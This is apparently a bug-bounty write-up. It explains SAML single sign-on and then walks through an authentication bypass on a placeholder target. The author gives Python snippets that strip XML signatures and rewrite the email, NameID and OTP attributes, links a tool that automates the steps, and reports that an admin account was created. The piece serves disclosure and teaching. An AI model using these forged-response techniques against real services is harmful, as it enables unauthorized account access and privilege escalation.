
Hey, hunters!,

It’s your buddy Ahmed Tarek again with a new interesting finding. I’ve discovered a critical security flaw in the SAML authentication system. This vulnerability can allow an attacker to bypass authentication and gain unauthorized access to the system, including potential administrative privileges.

Grab ur coffe, **and let’s get started! 😉**

## What is SAML Authentication?

SAML (Security Assertion Markup Language) is used for Single Sign-On (SSO). it is a feature that allows users to access multiple services without logging in multiple times, For example, if you are logged into facebook.com, you wouldn’t have to reenter your credentials to use messenger.com.

# How SAML works?

SAML uses XML to send authentication data between an Identity Provider (IdP) and a Service Provider (SP), so when a user tries to access certain services, the identity provider can provide SAML attributes to the service provider once the user logs in first to Single Sign On with the identity provider. The service provider asks the identity provider for authentication and authorization.

Each identity provider and service provider need to agree upon the configuration for SAML. Both ends need to have the exact configuration for the SAML authentication to work.

![](https://miro.medium.com/v2/resize:fit:700/1*A0XuIowU9ovCuRYaYObfsw.png)

will make you understand more

# SAML Response Structure

The anatomy of a SAML response is essential to understanding how this authentication and authorization protocol works. Here’s a breakdown of the key components of a SAML response:

![](https://miro.medium.com/v2/resize:fit:200/0*B8UD5YnG6X2fdlFH.png)

1. **XML Structure**: A SAML response is an XML document. It starts with the XML declaration, which specifies the XML version and character encoding. The rest of the document is enclosed within a pair of `<samlp:Response>` tags.
2. **Response Attributes**:

- `ID`: An identifier for the SAML response ( uniqe ) .
- `Version`: The version of the SAML protocol being used (e.g., 2.0).
- `IssueInstant`: The timestamp indicating when the response was issued.
- `Destination`: The URL of the intended recipient of the response (usually the service provider).
- `InResponseTo`: The ID of the SAML request to which this response is a reply.

**3. Issuer**: The `<saml:Issuer>` element specifies the entity (usually the IdP) that issued the SAML response. This is an important element for verifying the response’s authenticity.

**4. Status**: The `<samlp:Status>` element indicates the overall status of the response. It contains a `<samlp:StatusCode>` element that can have various values such as “Success” or “Requester” (indicating an error).

**5. Assertions:** A SAML response can contain one or more assertions, which are statements about a subject, typically the user. There are two main types of assertions:

- **Authentication Assertion (saml:AuthnStatement)**: Contains information about the user’s authentication, like when and how they authenticated.
- **Attribute Assertion (saml:AttributeStatement)**: Carries user attributes (e.g., username, email) or additional information.

**6. Signature:** To ensure the integrity and authenticity of the SAML response, it’s usually signed using the IdP’s private key. The `<ds:Signature>` element contains the cryptographic signature.

**7. Conditions:** The `<saml:Conditions>` element sets constraints on the validity of the assertion. This includes attributes like `NotBefore` (the earliest time the assertion can be used) and `NotOnOrAfter` (the latest time the assertion can be used).

**8. Subject:** The `<saml:Subject>` element identifies the subject of the assertion, typically the user. Within it, you’ll find the `<saml:NameID>` element, which contains a unique identifier for the user.

**9. Audience Restriction:** The `<saml:AudienceRestriction>` element specifies the intended audience of the assertion, usually the service provider’s entity ID. It helps prevent assertion replay attacks.

**10. Conditions:** This part of the response defines the conditions under which the assertion is valid, such as the time frame and audience.

**11. Attribute Statements:** If included, the `<saml:AttributeStatement>` section contains user attributes and their values. These attributes are typically used by the service provider to grant access or populate user profiles.

**12. Signature Verification:** To validate the SAML response, the service provider must verify the signature. This involves checking the signature against the IdP’s public key to ensure that the response has not been tampered with.

A simplified example of a SAML identity assertion is presented below. This assertion communicates the user’s identity via the user’s username:

<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_abc123" Version="2.0" IssueInstant="2023–10–18T14:30:00Z">  
 <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>  
 <samlp:Status>  
 <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>  
 </samlp:Status>  
 <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_def456" IssueInstant="2023–10–18T14:30:00Z">  
 <saml:AttributeStatement>  
 <saml:Attribute Name="user">  
 <saml:AttributeValue>john.doe@example.com</saml:AttributeValue>  
 </saml:Attribute>  
 <saml:Attribute Name="name">  
 <saml:AttributeValue>John Doe</saml:AttributeValue>  
 </saml:Attribute>  
 </saml:AttributeStatement>  
 <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">  
 <! - Signature data goes here →  
 </ds:Signature>  
 </saml:Assertion>  
 </samlp:Response>

In real-world scenarios, SAML responses are usually encoded in base64 or other secure encoding schemes for transmission.

![](https://miro.medium.com/v2/resize:fit:700/0*MA_lWMcMh-KLBfGf.png)

![](https://miro.medium.com/v2/resize:fit:700/0*iEBa-Dz8SdOJ2yE8.png)

# NOW The Bug:

well as usual, let’s consider our target as _example.com_ After collecting subdomains through various methods like subdomain enumeration, reverse DNS lookup, and Google dorks, I found a subdomain: `login-otp.example.com/login`.

![](https://miro.medium.com/v2/resize:fit:700/1*N5cC0C0yx5PIKBoxOFxMqA.png)

so the first thing you gotta do when you find a login page is to check the source code for any leaks or useful information. Unfortunately, i didn’t find much, except that email addresses that ends with company’s domain name were getting special treatment.

![](https://miro.medium.com/v2/resize:fit:700/1*CylH7kTGdRxc8fM5skn1Uw.png)

BORING

**BORING** Anyway, let’s continue.

i entered any random shit and clicked login to inspect the request

![](https://miro.medium.com/v2/resize:fit:700/1*Y1HVsM2M6-uI3IkJEs60WA.png)

the request to `[https://login-otp.example.com/SAML2/SSO/POST](https://login-otp.example.com/SAML2/SSO/POST.)` with the `SAMLRequest` parameter and my entered data

what I did was decode the original SAML response and play some games with it for hours:

<?xml version="1.0" encoding="UTF-8"?><saml2p:AuthnRequest xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" AssertionConsumerServiceURL="https://accounts-otp.exmaple.com/authenticated" ID="__b261eb3afa7ee41b11f2965608172e35" IssueInstant="2024-07-30T18:12:25.595Z" ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Version="2.0"><saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">account_manager_otp_b</saml2:Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">  
<ds:SignedInfo>  
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>  
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha512"/>  
<ds:Reference URI="#__b261eb3afa7ee41b11f2965608172e35">  
<ds:Transforms>  
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>  
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>  
</ds:Transforms>  
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>  
<ds:DigestValue>DhHSW4NWQQN9smpO5+L67m5KGoT5ahKpOrUwsb4d6WU=</ds:DigestValue>  
</ds:Reference>  
</ds:SignedInfo>  
<ds:SignatureValue>  
b0Ivq52trxBFfLp8FvqJ4hY8+F4X7d6m2/MC9CMGZughdMXrF7RJz9lBdBUeZ1MjoujqGqo63fm5&#13;  
gwUCOtD/tmlUVUKI2ukEyo12BSnETwICoCNK6GmfSor2QmtgVxqy896VFqWNHvmFM+mOcZ3C4+vI&#13;  
lqR4bNWwGLuJiQyKBbMlkEsu9Zt+oQiSFazRWVVlU7a2jaEIjZHSc9rV3n5XIOOv4Sgm4/DVsuNT&#13;  
rQcsxhHfLslUOoTJoPs/8M8rbtI5xizbd574qHQ4NgGfBDe0r9TSOqA8/tWfdBcXqbcYE6FE3kka&#13;  
miK2VnzuRTL6rB739Q21Ei1lejwM4BHU1ktAGxfx6f9NidJry35VkNzb9bzSwSC3/PQgOvWczPDj&#13;  
O8KjxL5dEZy+2TVe9FLaP6BBP6dLSNQeg6u77OgpRM/04nmVzSOBG2wXutWV0njjxlmRBppWMx/L&#13;  
qjQKKhkqq6etAN2FPUfNHsBY5lfQziHe8XHOT/9zHF39Ex9qM0GL65AnjEHQI3T7NtHjCg1gXtar&#13;  
wn2puoVNYxy/EnADFy7IbJ4fH9p+47B0eIOFgL0J04/cgcZ5SREIz54JkNx5mBeqB1KIb7wfVfe2&#13;  
dRWu6INaHaPwsU0jAxqV2MpzMLilMnbns7DhFCjKH8JsQfYS+BkprEOXbgL5X6tFu326ZYtuKQo=  
</ds:SignatureValue>  
</ds:Signature><saml2p:Extensions><odin:version xmlns:odin="http://odin.vrsn.com">v3</odin:version></saml2p:Extensions></saml2p:AuthnRequest>

— If you got lost in here, refer to the “SAML Response Structure” section in the first part of the write-up for guidance —

1. Password:

well i didn’t do anything with the password, because i enterd the comapny email so it is no use

2. i changed the ID :

ID=”b261eb3afa7ee41b11f2965608172e35" :

Every request has a unique ID and technically we are sending a new reqeust so it needs a new ID, I generated a new ID using UUID.

import uuid  
  
new_id = str(uuid.uuid4())  
print(new_id) 

3. Removes all `<Signature>` elements from the manipulated response.

for i in evilroot.xpath('//*[local-name(.)=\'Signature\']'):  
    i.getparent().remove(i)

By doing this i was able to bypass the validation mechanisms that would otherwise ensure the response’s authenticity. This step is critical in testing how a system handles tampered or unsigned responses.

4. Modify Attributes

evilroot.xpath('//*[local-name(.)=\'Attribute\' and @Name=\'account_manager_otp\']')[0][0].text = 'new_otp_value'  
evilroot.xpath('//*[local-name(.)=\'Attribute\' and @Name=\'Email\']')[0][0].text = 'newemail@example.com'  
evilroot.xpath('//*[local-name(.)=\'NameID\']')[0].text = 'newemail@example.com'  

I updated specific attributes in the SAML response to test the system’s handling of altered data

![](https://miro.medium.com/v2/resize:fit:300/1*aN0Avjoqwo0GstmcrVoJcA.jpeg)

Well, that’s kinda boring (even tho manually it’s more efficient), so I made a Python script to automate the whole process of tweaking the SAML response : [https://github.com/0xxnum/saml_injector/blob/main/saml_injector.py](https://github.com/0xxnum/saml_injector/blob/main/saml_injector.py)

This script takes a SAMLResponse as a command-line argument, decodes it from base64, and parses the XML structure. It removes the original digital signature and modifies specified attributes within the response, such as the OTP, email, and user identifier (in my case). After applying these changes, it re-encodes the modified SAMLResponse back to base64 and prints the new value. This modified response can be used to simulate attacks or test vulnerabilities in SAML-based authentication systems, and you can customize the attributes based on your target’s requirements.

and then i ran the script in python3 with the oringnal SAMLResponse as argument

python3 script.py <OriginalSAMLResponse>

and then i Replaced the parameter value with the one given by the script and forward the request, and the admin acccount had been created!

![](https://miro.medium.com/v2/resize:fit:700/1*5k5FzvDvXMm7dYGk9f_ahA.png)

![](https://miro.medium.com/v2/resize:fit:220/1*YYgAkgtRSn25baWrdzS9-Q.gif)

# Impact

The developer mistake is **not implementing proper signature validation and verification for SAML responses**. This failure allows attackers to modify the SAML response, including altering IDs, attributes, and removing signature elements, enabling unauthorized access or privilege escalation.

So yeah I wrote a detailed report and submitted it with a proof of concept. and after a week, unfortunatley got it as Duplicate.

![](https://miro.medium.com/v2/resize:fit:700/1*U-sQJi9rL8b8_1VsDoa1MQ.jpeg)

# Lesson Learnt !

**Verify signature validation rigorously.** Always test how a system handles tampered or unsigned SAML responses. Ensure the system enforces proper signature validation and does not accept altered or unsigned responses. Validate that the SAML response’s integrity and authenticity are maintained by the service provider.

